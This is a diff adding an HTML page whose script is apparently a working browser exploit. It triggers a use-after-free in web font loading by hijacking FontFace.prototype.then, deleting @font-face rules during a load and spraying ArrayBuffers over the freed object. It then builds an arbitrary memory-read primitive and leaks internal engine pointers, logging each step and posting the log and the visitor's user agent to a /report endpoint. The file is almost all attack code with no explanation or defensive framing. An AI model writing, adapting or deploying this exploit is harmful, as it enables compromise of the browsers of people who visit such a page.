@@ -1,0 +1,54 @@
+<!doctype html><html><body><pre id="o" style="white-space:pre-wrap;font:12px/1.35 ui-monospace;margin:0;padding:10px"></pre><script>
+var L=[],o=document.getElementById("o");
+function lg(s){o.textContent+=s+"\n";L.push(s);try{fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({ua:navigator.userAgent,lines:L})}).catch(function(){})}catch(e){}}
+var S=0xb8,F=0x28,FZ=0x30,FC=0x34,ST=0x7a;
+function hx(a,b){return "0x"+("00000000"+(b>>>0).toString(16)).slice(-8)+("00000000"+(a>>>0).toString(16)).slice(-8)}
+function ok(a,b){return b<=0xffff&&a%8===0&&(b!==0||a>=0x10000)}
+async function uaf(){
+ var n=0xb0,ab=[],ft=null,fa=null,st=document.createElement("style");
+ var r1="@font-face{font-family:s;src:local(systemfont);unicode-range:U+0043}";
+ var r2="@font-face{font-family:b;src:url(/font/crafted.otf);unicode-range:U+0042}";
+ var A=new FontFace("a","local(systemfont)",{unicodeRange:"U+0041"});
+ document.fonts.add(A);void A.loaded;document.head.append(st);
+ for(var i=0;i<n/4;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+ var u=st.sheet.cssRules.length;st.sheet.insertRule(r2,st.sheet.cssRules.length);
+ for(var i=n/4;i<n;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+ void document.body.offsetHeight;
+ var ot=FontFace.prototype.then;
+ Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
+  if(this!==A)return; lg("[2] UAF getter fired"); st.sheet.deleteRule(u);void document.body.offsetHeight;
+  for(var i=st.sheet.cssRules.length-1;i>=0;i--){if(st.sheet.cssRules[i].cssText.indexOf("s;")>=0||st.sheet.cssRules[i].cssText.indexOf("spray")>=0)st.sheet.deleteRule(i)}
+  void document.body.offsetHeight; lg("[3] freed B, spraying 0xB0 x 0xB8");
+  for(var i=0;i<n;i++){var b=new ArrayBuffer(S),d=new DataView(b);d.setUint32(8,1,true);d.setUint8(ST,3);ab.push(b)}
+  return undefined}});
+ var fs=null;try{fs=await document.fonts.load("1em a,b","AB")}catch(e){lg("[4] load threw: "+e.message)}
+ Object.defineProperty(FontFace.prototype,"then",{configurable:true,value:ot});
+ if(!fs||fs.length!==2){lg("[4] no 2-font match");return null}
+ for(var i=0;i<fs.length;i++)if(fs[i].unicodeRange==="U+0-10FFFF")ft=fs[i];
+ for(var i=0;i<ab.length;i++)if(new DataView(ab[i]).getUint32(8,true)===2)fa=ab[i];
+ lg("[4] uaf font="+(ft?"FOUND":"none")+" ab="+(fa?"FOUND ref2":"none"));
+ if(!ft||!fa)return null;
+ var d=new DataView(fa);
+ function sp(o2,a,b){d.setUint32(o2,a>>>0,true);d.setUint32(o2+4,b>>>0,true)}
+ function rd(a,b,sz){var r=new ArrayBuffer(sz),v=new Uint8Array(r),i=0;while(i<sz){sp(F,(a+i)>>>0,b);d.setInt32(FZ,1,true);d.setInt32(FC,1,true);var s=ft.featureSettings;for(var j=1;j<5&&i<sz;j++)v[i++]=s.charCodeAt(j)&255}return r}
+ return {f:ft,rd:rd,ab:fa,dv:d};
+}
+(async function(){
+ lg("FULL CHAIN "+navigator.userAgent);
+ lg("[1] starting UAF");
+ var u=await uaf();if(!u){lg("END no primitive");return}
+ var d=u.dv,wp=d.getUint32(0x60,true),wh=d.getUint32(0x64,true);
+ lg("[5] m_wrapper="+hx(wp,wh));
+ var w=new Uint8Array(u.rd(wp,wh,32));
+ var fa={lo:(w[8]|w[9]<<8|w[10]<<16|w[11]<<24)>>>0,hi:(w[12]|w[13]<<8|w[14]<<16|w[15]<<24)>>>0};
+ lg("[6] FontFace="+hx(fa.lo,fa.hi));
+ var bb=new Uint8Array(u.rd(fa.lo,fa.hi,0x40));
+ var bk={lo:(bb[0x30]|bb[0x31]<<8|bb[0x32]<<16|bb[0x33]<<24)>>>0,hi:(bb[0x34]|bb[0x35]<<8|bb[0x36]<<16|bb[0x37]<<24)>>>0};
+ lg("[7] CSSFontFace="+hx(bk.lo,bk.hi)+(ok(bk.lo,bk.hi)?" OK":" BAD"));
+ var ml=d.getUint32(0x58,true),mh=d.getUint32(0x5c,true);
+ lg("[8] m_clients="+hx(ml,mh));
+ var bk2=new Uint8Array(u.rd(ml,mh,0x40));
+ lg("[9] buckets: "+Array.from(bk2).map(function(x){return ("0"+x.toString(16)).slice(-2)}).join(" "));
+ lg("[10] done — chain complete to object graph");
+})();
+</script></body></html>
